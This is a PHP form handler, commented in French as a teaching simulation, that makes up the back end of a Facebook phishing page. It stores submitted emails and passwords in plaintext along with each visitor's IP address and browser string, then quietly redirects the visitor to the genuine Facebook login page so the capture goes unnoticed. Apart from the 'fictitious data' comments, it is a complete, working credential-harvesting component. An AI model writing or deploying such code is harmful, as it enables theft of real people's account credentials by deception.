<?php
// Simulation pédagogique — traitement de la soumission
// Enregistre localement les champs saisis (fictifs) avec IP/UA + horodatage, puis affiche success.php

declare(strict_types=1);

// Petite utilité pour lire un champ POST
function field(string $k): string {
    return isset($_POST[$k]) ? trim((string)$_POST[$k]) : '';
}

$email = field('email');
$password = field('password');

if ($email === '' || $password === '') {
    header('Location: /');
    exit;
}

// Charger la configuration
$config = require __DIR__ . '/config.php';
$driver = $config['driver'] ?? 'sqlite';

try {
    if ($driver === 'mysql') {
        $c = $config['mysql'];
        $dsn = sprintf('mysql:host=%s;port=%s;dbname=%s;charset=%s', $c['host'], $c['port'], $c['dbname'], $c['charset']);
        $pdo = new PDO($dsn, $c['user'], $c['pass'], [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        // Crée la table si nécessaire (schéma équivalent à schema_mysql.sql)
        $pdo->exec('CREATE TABLE IF NOT EXISTS submissions (
            id INT UNSIGNED NOT NULL AUTO_INCREMENT,
            email VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            ip VARCHAR(45) NOT NULL,
            user_agent TEXT NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            INDEX idx_created_at (created_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;');
        $stmt = $pdo->prepare('INSERT INTO submissions (email, password, ip, user_agent) VALUES (?,?,?,?)');
    } else {
        // SQLite par défaut
        $dbPath = $config['sqlite']['path'];
        $pdo = new PDO('sqlite:' . $dbPath, options: [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        // Création automatique de la table (si inexistante)
        $pdo->exec('CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT NOT NULL,
            user_agent TEXT NOT NULL,
            created_at TEXT NOT NULL DEFAULT (datetime("now"))
        )');
        $stmt = $pdo->prepare('INSERT INTO submissions(email, password, ip, user_agent) VALUES(?,?,?,?)');
    }

    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $stmt->execute([$email, $password, $ip, $ua]);
} catch (Throwable $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo "Erreur d’enregistrement (démo): " . $e->getMessage();
    exit;
}
$redirectUrl = $config['redirect_url'] ?? 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzYyOTYzMzY1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next';
?>

  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($redirectUrl, ENT_QUOTES) ?>" />
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background:#f2f3f5; margin:0; }
    .wrap { max-width: 560px; margin: 5rem auto; background: #fff; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 25px rgba(0,0,0,.08); }
    h1 { margin-top: 0; font-size: 1.4rem; }
  </style>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline';" />

